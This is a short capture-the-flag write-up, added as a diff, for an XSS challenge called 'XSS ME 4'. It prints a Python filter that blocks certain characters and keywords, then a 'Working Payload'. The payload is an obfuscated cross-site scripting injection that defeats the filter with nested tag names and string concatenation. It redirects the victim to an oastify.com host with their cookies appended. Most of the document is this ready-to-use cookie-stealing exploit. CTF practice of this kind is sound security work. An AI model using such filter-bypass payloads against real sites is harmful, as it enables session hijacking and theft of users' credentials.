@@ -1,0 +1,22 @@
+XSS ME 4
+Write a payload to be sent to the bot! Your goal is to steal his cookies.
+
+You have to bypass this filter:
+
+def filter_4(payload):
+    if any(c in payload for c in '+"/'):
+return "Nope"
+    if "://" in payload.lower():
+return "Nope"
+    if "document" in payload.lower():
+return "Nope"
+    if "cookie" in payload.lower():
+return "Nope"
+    return payload.replace("script", "").replace("img", "").replace("svg", "")
+
+
+
+
+Working Payload
+
+<imimgg src=x onerror='javascscriptript:window[`docu`.concat(`ment`)].location.replace(String.fromCharCode(47).concat(String.fromCharCode(47)).concat(`xxxxxxxxxxxxxxxxxxx.oastify.com`).concat(String.fromCharCode(47)).concat(`?c=`).concat(window[`docu`.concat(`ment`)][`coo`.concat(`kie`)]))' >
